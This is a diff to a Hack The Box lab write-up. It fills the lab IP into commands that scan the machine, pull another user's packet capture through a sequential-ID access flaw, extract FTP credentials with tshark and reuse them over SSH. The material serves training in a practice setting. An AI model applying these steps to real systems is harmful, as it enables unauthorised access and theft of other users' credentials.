@@ -5,7 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Linux |
 | **Difficulty** | Easy |
-| **IP** | `10.129.x.x` |
+| **IP** | `10.129.82.172` |
 
 ## Synopsis
 
@@ -24,8 +24,8 @@ credentials are reused for SSH. On the box, the `/usr/bin/python3.8` binary carr
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 10.129.x.x
-nmap -p21,22,80 -sCV 10.129.x.x
+nmap -p- --min-rate=5000 -T4 10.129.82.172
+nmap -p21,22,80 -sCV 10.129.82.172
 ```
 
 ```
@@ -58,13 +58,13 @@ The capture ID in `/data/<id>` is sequential and **not bound to the current user
 session**. Manually requesting a lower ID returns someone else's capture:
 
 ```
-http://10.129.x.x/data/0
+http://10.129.82.172/data/0
 ```
 
 Download the pcap for capture `0` and open it in Wireshark (or `tshark`):
 
 ```bash
-wget http://10.129.x.x/download/0 -O 0.pcap
+wget http://10.129.82.172/download/0 -O 0.pcap
 tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
 ```
 
@@ -80,7 +80,7 @@ PASS <redacted-ftp-password>
 The same credentials work over SSH:
 
 ```bash
-ssh nathan@10.129.x.x
+ssh nathan@10.129.82.172
 ```
 
 The **user flag** is in `/home/nathan/user.txt`.
